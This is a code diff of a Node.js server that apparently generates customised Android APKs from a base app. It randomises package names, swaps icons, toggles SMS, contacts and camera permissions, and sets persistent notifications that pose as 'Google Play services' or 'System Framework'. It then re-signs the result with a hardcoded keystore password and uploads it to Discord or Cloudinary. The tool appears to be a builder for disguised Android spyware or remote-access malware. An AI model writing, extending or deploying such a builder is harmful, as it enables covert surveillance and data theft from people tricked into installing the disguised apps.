@@ -26,10 +26,6 @@ const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
-// ══════════════════════════════════════════════════════════════
-//  BINARY UTILITIES (Zero-DEX modification, Byte-exact)
-// ══════════════════════════════════════════════════════════════
-
 function toUtf16LE(str) {
     const buf = Buffer.alloc(str.length * 2);
     for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
@@ -77,7 +73,6 @@ function makeNeutralPerm(originalPerm) {
     return prefix + '0'.repeat(needed);
 }
 
-// ── Package Name Pool ─────────────────────────────────────────
 const OLD_PKG = 'com.asml.tech';
 const PKG_POOL = [
     'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
@@ -94,11 +89,6 @@ function resolvePackage(userPkg) {
     return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
 }
 
-/**
- * Surgically replace ONLY the manifest package ID string in AXML.
- * Keeps all component class names (MainActivity, CoreService, etc.) untouched
- * so Android can resolve and launch them from classes.dex without ClassNotFoundException.
- */
 function patchManifestPackageOnly(manifestBuf, newPkg) {
     const stringCount = manifestBuf.readUInt32LE(16);
     const stringStart = manifestBuf.readUInt32LE(28);
@@ -112,21 +102,18 @@ function patchManifestPackageOnly(manifestBuf, newPkg) {
         const strOffset = absOffset + 2;
         const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);
 
-        // ONLY match the exact package name string, NOT class names like com.asml.tech.ui.MainActivity
         if (str === OLD_PKG) {
             targetBuf.copy(manifestBuf, strOffset);
             replaced = true;
-            console.log(`[PATCH] Surgically replaced manifest package at string index ${i}: "${OLD_PKG}" -> "${newPkg}"`);
+            console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${newPkg}"`);
             break;
         }
     }
     return replaced;
 }
 
-// ── App Name Placeholder ──────────────────────────────────────
-const APP_NAME_PH = 'AppTitlePlaceholder_'; // 20 chars
+const APP_NAME_PH = 'AppTitlePlaceholder_';
 
-// ── Icon Density Files in Base APK ───────────────────────────
 const KNOWN_ICON_ENTRIES = [
     { path: 'res/d2.webp', size: 48 },
     { path: 'res/yw.webp', size: 48 },
@@ -161,7 +148,6 @@ const KNOWN_ICON_ENTRIES = [
 ];
 
 async function replaceIcons(zip, pngBuffer) {
-    // 1. Delete Adaptive Icon XMLs so Android launcher displays custom density icons
     const adaptiveXmls = [
         'res/BW.xml',
         'res/0K.xml',
@@ -171,11 +157,9 @@ async function replaceIcons(zip, pngBuffer) {
     for (const xml of adaptiveXmls) {
         if (zip.getEntry(xml)) {
             zip.deleteFile(xml);
-            console.log(`[ICON] Removed adaptive XML: ${xml}`);
         }
     }
 
-    // 2. Pre-generate WebP & PNG buffers for standard sizes (48, 72, 96, 144, 192)
     const sizes = [48, 72, 96, 144, 192];
     const webpCache = {};
     const pngCache = {};
@@ -184,7 +168,6 @@ async function replaceIcons(zip, pngBuffer) {
         pngCache[s] = await sharp(pngBuffer).resize(s, s).png().toBuffer();
     }
 
-    // 3. Overwrite all known entries
     let count = 0;
     for (const item of KNOWN_ICON_ENTRIES) {
         const entry = zip.getEntry(item.path);
@@ -202,7 +185,6 @@ async function replaceIcons(zip, pngBuffer) {
         }
     }
 
-    // 4. Scan for any remaining mipmap entries in ZIP and replace them
     for (const entry of zip.getEntries()) {
         const name = entry.entryName;
         if (name.startsWith('res/mipmap-') && (name.endsWith('.webp') || name.endsWith('.png'))) {
@@ -222,10 +204,9 @@ async function replaceIcons(zip, pngBuffer) {
         }
     }
 
-    console.log(`[ICON] Successfully replaced ${count} icon files across all densities`);
+    console.log(`[ICON] Replaced ${count} icon files`);
 }
 
-// ── Notification Presets ─────────────────────────────────────
 const NOTIF_PRESETS = {
     default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
     sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
@@ -238,10 +219,6 @@ const NOTIF_PRESETS = {
     cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
     active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
 };
-
-// ══════════════════════════════════════════════════════════════
-//  /generate ENDPOINT
-// ══════════════════════════════════════════════════════════════
 
 app.post('/generate', upload.single('icon'), async (req, res) => {
     const {
@@ -277,30 +254,25 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
             const zip = new AdmZip(BASE_APK);
 
-            // ── Step 1: Patch App Name in resources.arsc ─────────────
             await sendUpdate('apk_progress', { step: 'Patching application title...', progress: 20 });
             const arscEntry = zip.getEntry('resources.arsc');
             if (arscEntry) {
                 const arscBuf = arscEntry.getData();
                 const paddedName = fixedLen(targetName, APP_NAME_PH.length);
-                const count = binaryReplaceU8(arscBuf, APP_NAME_PH, paddedName);
+                binaryReplaceU8(arscBuf, APP_NAME_PH, paddedName);
                 arscEntry.setData(arscBuf);
-                arscEntry.header.method = 0; // CRITICAL: method 0 (STORED)
-                console.log(`[PATCH] App name replaced: ${count} occurrences -> "${paddedName.trim()}"`);
+                arscEntry.header.method = 0;
             }
 
-            // ── Step 2: Patch AndroidManifest.xml (AXML UTF-16LE) ───
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
             const manifestEntry = zip.getEntry('AndroidManifest.xml');
             if (manifestEntry) {
                 const manifestBuf = manifestEntry.getData();
 
-                // 2a. Surgically replace ONLY the manifest package ID (leaves class names intact to prevent crash)
                 if (targetPkg !== OLD_PKG) {
                     patchManifestPackageOnly(manifestBuf, targetPkg);
                 }
 
-                // 2b. Neutralize unrequested permissions
                 const isSmsEnabled      = enableSmsPermission === 'true';
                 const isContactsEnabled = enableContactsPermission === 'true';
                 const isCameraEnabled   = enableCameraPermission === 'true';
@@ -340,18 +312,15 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     const neutral = makeNeutralPerm(perm);
                     binaryReplaceU16(manifestBuf, perm, neutral);
                 }
-                console.log(`[PATCH] Neutralized ${permsToNeutralize.length} unrequested permissions in manifest`);
 
                 manifestEntry.setData(manifestBuf);
             }
 
-            // ── Step 3: Replace Icons & Delete Adaptive XMLs ────────
             if (customIcon && customIcon.buffer) {
                 await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
                 await replaceIcons(zip, customIcon.buffer);
             }
 
-            // ── Step 4: Inject Runtime Configuration ────────────────
             await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
             const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));
 
@@ -378,7 +347,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
             zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));
 
-            // ── Step 5: Strip Old Signatures ─────────────────────────
             await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
             const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
             for (const entry of zip.getEntries()) {
@@ -388,15 +356,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // CRITICAL: Ensure resources.arsc method is STORED (0)
             const finalArsc = zip.getEntry('resources.arsc');
             if (finalArsc) finalArsc.header.method = 0;
 
-            // ── Step 6: Write Unsigned APK ───────────────────────────
             zip.writeZip(unsignedPath);
-            console.log(`[APK] Unsigned APK written (${(fs.statSync(unsignedPath).size / 1024 / 1024).toFixed(1)} MB)`);
 
-            // ── Step 7: Sign with usman90.jks (V1+V2+V3 + Zipalign) ─
             await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
             const ksArgs = fs.existsSync(KEYSTORE)
                 ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
@@ -410,20 +374,17 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
                             { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                     } else {
-                        console.log('[SIGN] uber-apk-signer completed successfully');
                         resolve();
                     }
                 });
             });
 
-            // ── Step 8: Locate Signed Output ─────────────────────────
             await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
             const signedName = fs.readdirSync(TEMP_DIR)
                 .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
             if (!signedName) throw new Error('Signed APK not found after signing step');
             const signedPath = path.join(TEMP_DIR, signedName);
 
-            // ── Step 9: Upload Output ────────────────────────────────
             let downloadUrl = '';
             await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });
 
@@ -435,7 +396,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                     });
                     downloadUrl = r.data?.attachments?.[0]?.url || '';
-                    if (downloadUrl) console.log('[UPLOAD] Discord:', downloadUrl);
                 } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
             }
 
@@ -455,24 +415,22 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     });
                     downloadUrl = r.secure_url || '';
                     if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
-                    if (downloadUrl) console.log('[UPLOAD] Cloudinary:', downloadUrl);
                 } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
             }
 
-            // ── Step 10: Cleanup ─────────────────────────────────────
             [unsignedPath, signedPath].forEach(p => {
                 try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
             });
 
             if (downloadUrl) {
                 await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
-                console.log(`[APK] ✓ Done: ${uuid} | pkg=${targetPkg}`);
+                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg}`);
             } else {
-                await sendUpdate('apk_error', { message: 'Upload failed — check DISCORD_WEBHOOK_URL or CLOUDINARY configuration' });
+                await sendUpdate('apk_error', { message: 'Upload failed' });
             }
 
         } catch (err) {
-            console.error(`[APK] ✗ Failed ${uuid}:`, err.message);
+            console.error(`[APK] Failed ${uuid}:`, err.message);
             try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
             try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
         }
@@ -480,4 +438,3 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 });
 
 app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
-
